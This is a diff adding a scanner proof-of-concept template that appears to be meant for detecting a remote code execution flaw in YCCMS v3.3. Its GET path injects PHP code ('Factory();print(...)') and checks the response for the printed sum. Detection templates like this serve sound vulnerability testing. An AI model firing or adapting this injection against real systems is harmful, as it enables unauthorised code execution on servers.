@@ -1,0 +1,14 @@
+name: poc-yaml-yccms-rce
+set:
+  r: randomInt(800000000, 1000000000)
+  r1: randomInt(800000000, 1000000000)
+rules:
+  - method: GET
+    path: "/admin/?a=Factory();print({{r}}%2b{{r1}});//../"
+    expression: |
+      response.body.bcontains(bytes(string(r + r1)))
+detail:
+  author: j4ckzh0u(https://github.com/j4ckzh0u),violin
+  yccms: v3.3
+  links:
+    - https://blog.csdn.net/qq_36374896/article/details/84839891
